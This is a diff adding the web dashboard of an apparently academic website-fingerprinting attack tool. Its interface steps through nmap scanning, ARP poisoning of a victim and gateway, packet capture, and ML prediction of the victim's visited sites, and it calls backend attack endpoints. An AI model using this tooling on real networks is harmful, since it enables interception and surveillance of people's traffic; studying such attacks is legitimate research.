@@ -1,0 +1,1505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DeepMASQUE — Attack Dashboard</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;500;600&display=swap');
+
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #111318;
+    --bg3: #181c23;
+    --border: #1e2430;
+    --accent: #00ff88;
+    --accent2: #0088ff;
+    --warn: #ff6b35;
+    --red: #ff3355;
+    --text: #c8d0e0;
+    --text-dim: #4a5568;
+    --text-bright: #eef2ff;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Inter', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ── HEADER ── */
+  header {
+    border-bottom: 1px solid var(--border);
+    padding: 14px 28px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: var(--bg2);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .logo {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .logo span { color: var(--text-dim); }
+
+  .status-bar {
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    font-family: var(--mono);
+    font-size: 11px;
+  }
+
+  .status-pill {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 4px 10px;
+    border-radius: 3px;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+  }
+
+  .status-pill.active { border-color: var(--accent); color: var(--accent); }
+  .status-pill.running { border-color: var(--warn); color: var(--warn); }
+  .status-pill.done { border-color: var(--accent2); color: var(--accent2); }
+
+  .dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: currentColor;
+  }
+
+  .dot.pulse {
+    animation: pulse 1.2s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.2; }
+  }
+
+  /* ── LAYOUT ── */
+  .main {
+    display: grid;
+    grid-template-columns: 260px 1fr;
+    grid-template-rows: auto 1fr;
+    height: calc(100vh - 49px);
+  }
+
+  /* ── SIDEBAR ── */
+  .sidebar {
+    grid-row: 1 / 3;
+    border-right: 1px solid var(--border);
+    background: var(--bg2);
+    padding: 20px 0;
+    overflow-y: auto;
+  }
+
+  .sidebar-section {
+    padding: 8px 20px 4px;
+    font-size: 9px;
+    font-family: var(--mono);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-top: 12px;
+  }
+
+  .step-item {
+    padding: 10px 20px;
+    cursor: pointer;
+    border-left: 2px solid transparent;
+    transition: all 0.15s;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 13px;
+  }
+
+  .step-item:hover { background: var(--bg3); }
+  .step-item.active { border-left-color: var(--accent); background: var(--bg3); color: var(--text-bright); }
+  .step-item.completed { color: var(--accent); }
+  .step-item.running-step { border-left-color: var(--warn); color: var(--warn); }
+
+  .step-num {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    min-width: 18px;
+  }
+
+  .step-item.active .step-num { color: var(--accent); }
+  .step-item.completed .step-num { color: var(--accent); }
+
+  /* ── TARGET CONFIG ── */
+  .config-panel {
+    padding: 20px 24px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg2);
+    display: flex;
+    gap: 16px;
+    align-items: flex-end;
+    flex-wrap: wrap;
+  }
+
+  .field-group { display: flex; flex-direction: column; gap: 5px; }
+
+  .field-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .field-input {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text-bright);
+    font-family: var(--mono);
+    font-size: 13px;
+    padding: 7px 12px;
+    border-radius: 4px;
+    outline: none;
+    width: 180px;
+    transition: border-color 0.15s;
+  }
+
+  .field-input:focus { border-color: var(--accent2); }
+
+  .btn {
+    padding: 8px 18px;
+    border-radius: 4px;
+    border: none;
+    cursor: pointer;
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    transition: all 0.15s;
+  }
+
+  .btn-primary {
+    background: var(--accent);
+    color: #000;
+  }
+
+  .btn-primary:hover { background: #00dd77; }
+  .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+
+  .btn-danger {
+    background: transparent;
+    border: 1px solid var(--red);
+    color: var(--red);
+  }
+
+  .btn-danger:hover { background: var(--red); color: #fff; }
+
+  .btn-secondary {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
+  }
+
+  .btn-secondary:hover { border-color: var(--accent2); color: var(--accent2); }
+
+  /* ── CONTENT ── */
+  .content {
+    overflow-y: auto;
+    padding: 0;
+  }
+
+  .panel {
+    display: none;
+    padding: 24px;
+    animation: fadein 0.2s ease;
+  }
+
+  .panel.active { display: block; }
+
+  @keyframes fadein { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
+
+  /* ── TERMINAL ── */
+  .terminal {
+    background: #060809;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+    font-family: var(--mono);
+    font-size: 12px;
+  }
+
+  .terminal-bar {
+    background: var(--bg3);
+    padding: 8px 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
+  .t-red { background: #ff5f56; }
+  .t-yellow { background: #ffbd2e; }
+  .t-green { background: #27c93f; }
+
+  .terminal-title {
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-left: 4px;
+  }
+
+  .terminal-body {
+    padding: 14px;
+    min-height: 140px;
+    max-height: 300px;
+    overflow-y: auto;
+    line-height: 1.6;
+  }
+
+  .t-prompt { color: var(--accent); }
+  .t-cmd { color: var(--text-bright); }
+  .t-output { color: #7a8499; }
+  .t-success { color: var(--accent); }
+  .t-warn { color: var(--warn); }
+  .t-error { color: var(--red); }
+  .t-highlight { color: var(--accent2); }
+  .t-cursor { display: inline-block; width: 8px; height: 14px; background: var(--accent); animation: blink 1s step-end infinite; vertical-align: middle; }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  /* ── SCAN TABLE ── */
+  .scan-grid {
+    display: grid;
+    grid-template-columns: 160px 160px 120px 1fr 80px;
+    gap: 0;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+    font-family: var(--mono);
+    font-size: 12px;
+  }
+
+  .scan-header {
+    display: contents;
+  }
+
+  .scan-header > div {
+    background: var(--bg3);
+    padding: 8px 12px;
+    color: var(--text-dim);
+    font-size: 10px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .scan-row {
+    display: contents;
+    cursor: pointer;
+  }
+
+  .scan-row > div {
+    padding: 9px 12px;
+    border-bottom: 1px solid var(--border);
+    transition: background 0.1s;
+  }
+
+  .scan-row:hover > div { background: var(--bg3); }
+  .scan-row.selected > div { background: rgba(0, 255, 136, 0.05); }
+
+  .tag {
+    display: inline-block;
+    padding: 2px 7px;
+    border-radius: 3px;
+    font-size: 10px;
+    font-family: var(--mono);
+  }
+
+  .tag-gateway { background: rgba(0, 136, 255, 0.15); color: var(--accent2); border: 1px solid rgba(0,136,255,0.3); }
+  .tag-target { background: rgba(255, 51, 85, 0.15); color: var(--red); border: 1px solid rgba(255,51,85,0.3); }
+  .tag-self { background: rgba(0,255,136,0.1); color: var(--accent); border: 1px solid rgba(0,255,136,0.2); }
+  .tag-device { background: rgba(74,85,104,0.3); color: var(--text-dim); border: 1px solid var(--border); }
+
+  /* ── PROGRESS STEPS ── */
+  .flow-steps {
+    display: flex;
+    gap: 0;
+    margin-bottom: 24px;
+  }
+
+  .flow-step {
+    flex: 1;
+    padding: 12px 16px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-right: none;
+    font-size: 11px;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    position: relative;
+  }
+
+  .flow-step:last-child { border-right: 1px solid var(--border); border-radius: 0 4px 4px 0; }
+  .flow-step:first-child { border-radius: 4px 0 0 4px; }
+
+  .flow-step.done { border-color: rgba(0,255,136,0.3); background: rgba(0,255,136,0.05); }
+  .flow-step.active-flow { border-color: var(--warn); background: rgba(255,107,53,0.05); }
+
+  .flow-step-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .flow-step.done .flow-step-label { color: var(--accent); }
+  .flow-step.active-flow .flow-step-label { color: var(--warn); }
+
+  .flow-step-title { font-size: 12px; color: var(--text-bright); font-weight: 500; }
+
+  /* ── STAT CARDS ── */
+  .stat-row {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+
+  .stat-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px 16px;
+  }
+
+  .stat-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+  }
+
+  .stat-value {
+    font-family: var(--mono);
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text-bright);
+  }
+
+  .stat-value.green { color: var(--accent); }
+  .stat-value.blue { color: var(--accent2); }
+  .stat-value.orange { color: var(--warn); }
+
+  /* ── PACKET STREAM ── */
+  .packet-stream {
+    background: #060809;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    height: 220px;
+    overflow-y: auto;
+    padding: 10px 14px;
+    font-family: var(--mono);
+    font-size: 11px;
+    line-height: 1.8;
+  }
+
+  .pkt { display: flex; gap: 12px; }
+  .pkt-time { color: var(--text-dim); min-width: 80px; }
+  .pkt-src { color: var(--warn); }
+  .pkt-dst { color: var(--accent2); }
+  .pkt-proto { color: var(--accent); min-width: 50px; }
+  .pkt-len { color: #7a8499; min-width: 50px; }
+  .pkt-info { color: #5a6478; }
+
+  /* ── PREDICT RESULT ── */
+  .predict-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 24px;
+    margin-bottom: 16px;
+  }
+
+  .predict-verdict {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin-bottom: 12px;
+  }
+
+  .predict-site {
+    font-size: 32px;
+    font-weight: 700;
+    color: var(--accent);
+    font-family: var(--mono);
+    margin-bottom: 8px;
+  }
+
+  .confidence-bar-wrap {
+    margin-top: 16px;
+  }
+
+  .confidence-label {
+    display: flex;
+    justify-content: space-between;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-bottom: 5px;
+  }
+
+  .confidence-bar {
+    height: 6px;
+    background: var(--border);
+    border-radius: 3px;
+    overflow: hidden;
+    margin-bottom: 10px;
+  }
+
+  .confidence-fill {
+    height: 100%;
+    border-radius: 3px;
+    transition: width 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+
+  .fill-high { background: var(--accent); }
+  .fill-med { background: var(--warn); }
+  .fill-low { background: var(--red); }
+
+  .top5 { margin-top: 20px; }
+  .top5-title {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 12px;
+  }
+
+  .section-title {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-bright);
+    margin-bottom: 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* ── ARP TABLE ── */
+  .arp-table {
+    font-family: var(--mono);
+    font-size: 12px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+
+  .arp-row {
+    display: grid;
+    grid-template-columns: 160px 200px 100px 1fr;
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--border);
+    transition: background 0.1s;
+  }
+
+  .arp-row:last-child { border-bottom: none; }
+  .arp-row.arp-header { background: var(--bg3); color: var(--text-dim); font-size: 10px; text-transform: uppercase; letter-spacing: 1px; }
+  .arp-row.poisoned { background: rgba(255,51,85,0.07); }
+  .arp-row.poisoned .arp-mac { color: var(--red); }
+  .arp-poison-badge { font-size: 9px; padding: 1px 6px; background: rgba(255,51,85,0.2); color: var(--red); border-radius: 3px; border: 1px solid rgba(255,51,85,0.3); }
+
+  .gap-sm { height: 16px; }
+  .gap-md { height: 24px; }
+
+  /* scrollbar */
+  ::-webkit-scrollbar { width: 4px; height: 4px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+  .footer {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    height: 24px;
+    background: var(--bg2);
+    border-top: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    z-index: 200;
+  }
+  .footer span { color: var(--accent); }
+  body { padding-bottom: 24px; }
+
+  .btn-row { display: flex; gap: 10px; margin-top: 16px; }
+  .info-box {
+    background: rgba(0,136,255,0.07);
+    border: 1px solid rgba(0,136,255,0.2);
+    border-radius: 5px;
+    padding: 10px 14px;
+    font-size: 12px;
+    color: var(--text);
+    margin-bottom: 16px;
+  }
+  .info-box span { color: var(--accent2); font-family: var(--mono); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">DeepMASQUE <span>// Attack Dashboard</span></div>
+  <div class="status-bar">
+    <div class="status-pill" id="pill-network">
+      <div class="dot"></div> NETWORK: IDLE
+    </div>
+    <div class="status-pill" id="pill-arp">
+      <div class="dot"></div> ARP: IDLE
+    </div>
+    <div class="status-pill" id="pill-capture">
+      <div class="dot"></div> CAPTURE: IDLE
+    </div>
+    <div class="status-pill" id="pill-model">
+      <div class="dot"></div> MODEL: IDLE
+    </div>
+  </div>
+</header>
+
+<div class="main">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-section">Attack Flow</div>
+
+    <div class="step-item active" onclick="showPanel('scan')" id="nav-scan">
+      <span class="step-num">01</span> Network Scan
+    </div>
+    <div class="step-item" onclick="showPanel('arp')" id="nav-arp">
+      <span class="step-num">02</span> ARP Spoofing
+    </div>
+    <div class="step-item" onclick="showPanel('capture')" id="nav-capture">
+      <span class="step-num">03</span> Traffic Capture
+    </div>
+    <div class="step-item" onclick="showPanel('convert')" id="nav-convert">
+      <span class="step-num">04</span> PCAP → CSV
+    </div>
+    <div class="step-item" onclick="showPanel('predict')" id="nav-predict">
+      <span class="step-num">05</span> Model Predict
+    </div>
+
+    <div class="sidebar-section" style="margin-top:28px;">Session</div>
+    <div class="step-item" id="target-info-sidebar">
+      <span class="step-num">IP</span> <span id="sb-victim">—</span>
+    </div>
+    <div class="step-item">
+      <span class="step-num">GW</span> <span id="sb-gw">—</span>
+    </div>
+    <div class="step-item">
+      <span class="step-num">PKT</span> <span id="sb-pkt">0</span>
+    </div>
+  </aside>
+
+  <div style="display:flex;flex-direction:column;overflow:hidden;">
+
+    <!-- CONFIG BAR -->
+    <div class="config-panel">
+      <div class="field-group">
+        <div class="field-label">Subnet</div>
+        <input class="field-input" id="subnet" value="192.168.0.0/24" style="width:160px;">
+      </div>
+      <div class="field-group">
+        <div class="field-label">Gateway IP</div>
+        <div style="display:flex;gap:6px;align-items:center;">
+          <input class="field-input" id="gateway-ip" value="192.168.0.1" style="width:140px;">
+          <button class="btn btn-secondary" onclick="detectGateway()" id="btn-detect-gw" style="padding:7px 12px;font-size:11px;">⟳ Auto</button>
+        </div>
+      </div>
+      <div class="field-group">
+        <div class="field-label">Interface</div>
+        <input class="field-input" id="iface" value="ens33" style="width:100px;">
+      </div>
+      <div class="field-group">
+        <div class="field-label">Capture Duration (s)</div>
+        <input class="field-input" id="cap-duration" value="30" style="width:90px;" type="number">
+      </div>
+    </div>
+
+    <!-- CONTENT -->
+    <div class="content">
+
+      <!-- ── STEP 1: SCAN ── -->
+      <div class="panel active" id="panel-scan">
+        <div class="section-title">01 — Network Scan <code style="font-size:11px;color:var(--text-dim);font-family:var(--mono);">nmap -sn {subnet}</code></div>
+
+        <div class="terminal" style="margin-bottom:16px;">
+          <div class="terminal-bar">
+            <div class="terminal-dot t-red"></div>
+            <div class="terminal-dot t-yellow"></div>
+            <div class="terminal-dot t-green"></div>
+            <span class="terminal-title">bash — nmap</span>
+          </div>
+          <div class="terminal-body" id="scan-term">
+            <div><span class="t-prompt">attacker@ubuntu:~$</span> <span class="t-cmd">_</span></div>
+          </div>
+        </div>
+
+        <div class="section-title">Discovered Hosts</div>
+
+        <div class="scan-grid" id="scan-grid">
+          <div class="scan-header">
+            <div>IP Address</div>
+            <div>MAC Address</div>
+            <div>Latency</div>
+            <div>Hostname</div>
+            <div>Role</div>
+          </div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" onclick="runScan()">▶ Run Scan</button>
+          <button class="btn btn-secondary" onclick="selectVictim()">Set as Victim</button>
+        </div>
+      </div>
+
+      <!-- ── STEP 2: ARP ── -->
+      <div class="panel" id="panel-arp">
+        <div class="section-title">02 — ARP Poisoning</div>
+
+        <div class="info-box" id="arp-info">
+          Target victim: <span id="arp-victim-display">not set</span> &nbsp;|&nbsp;
+          Gateway: <span id="arp-gw-display">192.168.0.1</span> &nbsp;|&nbsp;
+          Interface: <span id="arp-iface-display">ens33</span>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px;">
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="terminal-dot t-red"></div><div class="terminal-dot t-yellow"></div><div class="terminal-dot t-green"></div>
+              <span class="terminal-title">Terminal 1 — poison victim</span>
+            </div>
+            <div class="terminal-body" id="arp-term1">
+              <div><span class="t-prompt">attacker@ubuntu:~$</span> <span class="t-cmd">_</span></div>
+            </div>
+          </div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="terminal-dot t-red"></div><div class="terminal-dot t-yellow"></div><div class="terminal-dot t-green"></div>
+              <span class="terminal-title">Terminal 2 — poison gateway</span>
+            </div>
+            <div class="terminal-body" id="arp-term2">
+              <div><span class="t-prompt">attacker@ubuntu:~$</span> <span class="t-cmd">_</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="section-title">ARP Cache — Victim Machine</div>
+        <div class="arp-table" id="arp-table">
+          <div class="arp-row arp-header">
+            <div>Internet Address</div>
+            <div class="arp-mac">Physical Address</div>
+            <div>Type</div>
+            <div>Status</div>
+          </div>
+          <div class="arp-row">
+            <div>192.168.0.1</div>
+            <div class="arp-mac" id="arp-gw-mac">58-d9-d5-41-13-d8</div>
+            <div>dynamic</div>
+            <div><span style="color:var(--accent);">normal</span></div>
+          </div>
+          <div class="arp-row">
+            <div>192.168.0.255</div>
+            <div class="arp-mac">ff-ff-ff-ff-ff-ff</div>
+            <div>static</div>
+            <div>—</div>
+          </div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" onclick="runArpPoison()" id="btn-arp-start">▶ Start Poisoning</button>
+          <button class="btn btn-danger" onclick="stopArp()" id="btn-arp-stop" disabled>■ Stop</button>
+        </div>
+      </div>
+
+      <!-- ── STEP 3: CAPTURE ── -->
+      <div class="panel" id="panel-capture">
+        <div class="section-title">03 — Traffic Capture <code style="font-size:11px;color:var(--text-dim);font-family:var(--mono);">tcpdump</code></div>
+
+        <div class="stat-row" id="capture-stats">
+          <div class="stat-card">
+            <div class="stat-label">Packets Captured</div>
+            <div class="stat-value green" id="stat-pkt">0</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">QUIC / UDP</div>
+            <div class="stat-value blue" id="stat-quic">0</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Total Bytes</div>
+            <div class="stat-value orange" id="stat-bytes">0</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Elapsed</div>
+            <div class="stat-value" id="stat-time">0s</div>
+          </div>
+        </div>
+
+        <div class="section-title">Live Packet Stream</div>
+        <div class="packet-stream" id="packet-stream">
+          <div style="color:var(--text-dim);font-family:var(--mono);font-size:11px;">Waiting for capture to start...</div>
+        </div>
+
+        <div class="terminal" style="margin-top:16px;">
+          <div class="terminal-bar">
+            <div class="terminal-dot t-red"></div><div class="terminal-dot t-yellow"></div><div class="terminal-dot t-green"></div>
+            <span class="terminal-title">bash — tcpdump</span>
+          </div>
+          <div class="terminal-body" id="cap-term">
+            <div><span class="t-prompt">attacker@ubuntu:~$</span> <span class="t-cmd">_</span></div>
+          </div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" onclick="startCapture()" id="btn-cap-start">▶ Start Capture</button>
+          <button class="btn btn-danger" onclick="stopCapture()" id="btn-cap-stop" disabled>■ Stop & Save</button>
+        </div>
+      </div>
+
+      <!-- ── STEP 4: CONVERT ── -->
+      <div class="panel" id="panel-convert">
+        <div class="section-title">04 — PCAP → CSV Conversion</div>
+
+        <div class="info-box">
+          Input: <span>/tmp/victim_traffic.pcap</span> &nbsp;→&nbsp;
+          Output: <span>/tmp/trace.csv</span><br>
+          Columns: <span>direction</span>, <span>relative_time</span>, <span>length</span>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dot t-red"></div><div class="terminal-dot t-yellow"></div><div class="terminal-dot t-green"></div>
+            <span class="terminal-title">bash — pcap2csv.py</span>
+          </div>
+          <div class="terminal-body" id="conv-term">
+            <div><span class="t-prompt">attacker@ubuntu:~$</span> <span class="t-cmd">_</span></div>
+          </div>
+        </div>
+
+        <div class="gap-md"></div>
+        <div class="section-title">CSV Preview</div>
+
+        <div style="background:#060809;border:1px solid var(--border);border-radius:6px;overflow:hidden;font-family:var(--mono);font-size:11px;overflow-x:auto;" id="csv-preview-wrap">
+          <div style="background:var(--bg3);padding:6px 14px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:40px 70px 80px 120px 70px 130px 70px 130px 70px;color:var(--text-dim);font-size:10px;text-transform:uppercase;letter-spacing:1px;min-width:900px;">
+            <div>#</div><div>protocol</div><div>length</div><div>relative_time</div><div>dir</div><div>src_ip</div><div>src_port</div><div>dst_ip</div><div>dst_port</div>
+          </div>
+          <div id="csv-rows" style="max-height:220px;overflow-y:auto;min-width:900px;"></div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" onclick="runConvert()">▶ Convert PCAP</button>
+        </div>
+      </div>
+
+      <!-- ── STEP 5: PREDICT ── -->
+      <div class="panel" id="panel-predict">
+        <div class="section-title">05 — DeepMASQUE Prediction</div>
+
+        <div class="flow-steps" id="model-flow">
+          <div class="flow-step" id="fstep-load">
+            <div class="flow-step-label">Step 1</div>
+            <div class="flow-step-title">Load CSV</div>
+          </div>
+          <div class="flow-step" id="fstep-extract">
+            <div class="flow-step-label">Step 2</div>
+            <div class="flow-step-title">Extract Features</div>
+          </div>
+          <div class="flow-step" id="fstep-encode">
+            <div class="flow-step-label">Step 3</div>
+            <div class="flow-step-title">Encoder (ResNet18)</div>
+          </div>
+          <div class="flow-step" id="fstep-classify">
+            <div class="flow-step-label">Step 4</div>
+            <div class="flow-step-title">Classify</div>
+          </div>
+          <div class="flow-step" id="fstep-result">
+            <div class="flow-step-label">Step 5</div>
+            <div class="flow-step-title">Result</div>
+          </div>
+        </div>
+
+        <div class="terminal" style="margin-bottom:16px;">
+          <div class="terminal-bar">
+            <div class="terminal-dot t-red"></div><div class="terminal-dot t-yellow"></div><div class="terminal-dot t-green"></div>
+            <span class="terminal-title">bash — predict.py</span>
+          </div>
+          <div class="terminal-body" id="pred-term">
+            <div><span class="t-prompt">attacker@ubuntu:~$</span> <span class="t-cmd">_</span></div>
+          </div>
+        </div>
+
+        <div id="predict-result" style="display:none;">
+          <div class="section-title">Prediction Result</div>
+          <div class="predict-card">
+            <div class="predict-verdict">⚡ Victim is visiting</div>
+            <div class="predict-site" id="pred-site">—</div>
+
+            <div class="confidence-bar-wrap">
+              <div class="confidence-label">
+                <span>Confidence</span>
+                <span id="pred-conf-val">—</span>
+              </div>
+              <div class="confidence-bar">
+                <div class="confidence-fill fill-high" id="pred-conf-bar" style="width:0%"></div>
+              </div>
+            </div>
+
+            <div class="top5">
+              <div class="top5-title">Top-5 Candidates</div>
+              <div id="top5-list"></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" onclick="runPredict()">▶ Run Prediction</button>
+          <button class="btn btn-secondary" onclick="resetAll()">↺ Reset All</button>
+        </div>
+      </div>
+
+    </div><!-- /content -->
+  </div>
+</div>
+
+<script>
+// ── CONFIG ──
+const FLASK_URL = window.location.origin;  // tự detect: http://192.168.0.115:5000
+
+// ── STATE ──
+const state = {
+  victimIP: null,
+  victimMAC: null,
+  gatewayIP: '192.168.0.1',
+  arpRunning: false,
+  captureRunning: false,
+  elapsedSec: 0,
+  captureTimer: null,
+  statusPoller: null,
+  scannedHosts: [],
+  selectedIdx: null,
+};
+
+// ── NAVIGATION ──
+function showPanel(name) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.step-item').forEach(s => s.classList.remove('active'));
+  document.getElementById('panel-' + name).classList.add('active');
+  document.getElementById('nav-' + name).classList.add('active');
+  if (name === 'arp') updateArpInfo();
+}
+
+// ── TERMINAL HELPERS ──
+function termAppend(id, html) {
+  const el = document.getElementById(id);
+  el.innerHTML += html + '\n';
+  el.scrollTop = el.scrollHeight;
+}
+function termClear(id) { document.getElementById(id).innerHTML = ''; }
+function tLine(cls, text) { return `<div><span class="${cls}">${escHtml(text)}</span></div>`; }
+function tCmd(cmd) { return `<div><span class="t-prompt">attacker@ubuntu:~$</span> <span class="t-cmd">${escHtml(cmd)}</span></div>`; }
+function escHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+// ── PILL STATUS ──
+function setPill(id, label, status) {
+  const el = document.getElementById(id);
+  el.className = 'status-pill' + (status ? ' ' + status : '');
+  el.innerHTML = `<div class="dot${status === 'running' ? ' pulse' : ''}"></div> ${label}`;
+}
+
+// ── API HELPER ──
+async function api(method, path, body) {
+  const opts = { method, headers: { 'Content-Type': 'application/json' } };
+  if (body) opts.body = JSON.stringify(body);
+  const r = await fetch(FLASK_URL + path, opts);
+  return r.json();
+}
+
+// ── Auto-detect gateway ──
+async function detectGateway() {
+  const btn = document.getElementById('btn-detect-gw');
+  btn.textContent = '...';
+  btn.disabled = true;
+  try {
+    const d = await api('GET', '/attack/gateway');
+    if (d.error) {
+      alert('Cannot detect gateway: ' + d.error);
+      return;
+    }
+    document.getElementById('gateway-ip').value = d.gateway_ip;
+    document.getElementById('iface').value = d.interface;
+    btn.textContent = '✓ ' + d.gateway_ip;
+    setTimeout(() => { btn.textContent = '⟳ Auto'; }, 2000);
+  } catch(e) {
+    alert('Flask offline: ' + e.message);
+  } finally {
+    btn.disabled = false;
+  }
+}
+
+// ── FLASK STATUS CHECK ──
+async function checkFlaskStatus() {
+  try {
+    const d = await api('GET', '/status');
+    if (d.model_ready) {
+      setPill('pill-model', 'MODEL: READY', 'done');
+    } else {
+      setPill('pill-model', `MODEL: ${(d.load_status?.message || 'LOADING').slice(0,20)}`, 'running');
+      setTimeout(checkFlaskStatus, 3000);
+    }
+  } catch(e) {
+    setPill('pill-model', 'MODEL: OFFLINE', '');
+    setTimeout(checkFlaskStatus, 5000);
+  }
+}
+setTimeout(checkFlaskStatus, 800);
+
+// ══════════════════════════════════
+// STEP 1 — SCAN (real nmap via API)
+// ══════════════════════════════════
+async function runScan() {
+  termClear('scan-term');
+  setPill('pill-network', 'NETWORK: SCANNING', 'running');
+  document.getElementById('scan-grid').innerHTML = `
+    <div class="scan-header">
+      <div>IP Address</div><div>MAC Address</div><div>Latency</div><div>Hostname</div><div>Role</div>
+    </div>`;
+
+  const subnet = document.getElementById('subnet').value;
+  const gw     = document.getElementById('gateway-ip').value;
+  termAppend('scan-term', tCmd(`sudo nmap -sn ${subnet}`));
+
+  try {
+    const d = await api('POST', '/attack/scan', { subnet });
+    if (d.error) {
+      termAppend('scan-term', tLine('t-error', '[!] ' + d.error));
+      setPill('pill-network', 'NETWORK: ERROR', '');
+      return;
+    }
+
+    // Show raw output line by line
+    (d.raw || '').split('\n').forEach(line => {
+      if (!line.trim()) return;
+      const cls = line.includes('is up') ? 't-success'
+                : line.includes('MAC')   ? 't-highlight'
+                : 't-output';
+      termAppend('scan-term', tLine(cls, line));
+    });
+
+    state.scannedHosts = d.hosts || [];
+    state.selectedIdx  = null;
+
+    state.scannedHosts.forEach((h, i) => {
+      const role = h.ip === gw ? 'gateway' : 'device';
+      addScanRow({ ...h, role, lat: h.latency || '—', host: h.hostname || h.ip }, i);
+    });
+
+    termAppend('scan-term', tLine('t-success', `\nNmap done: ${state.scannedHosts.length} hosts up`));
+    setPill('pill-network', 'NETWORK: DONE', 'done');
+    document.getElementById('nav-scan').classList.add('completed');
+
+  } catch(e) {
+    termAppend('scan-term', tLine('t-error', '[!] Flask offline: ' + e.message));
+    setPill('pill-network', 'NETWORK: ERROR', '');
+  }
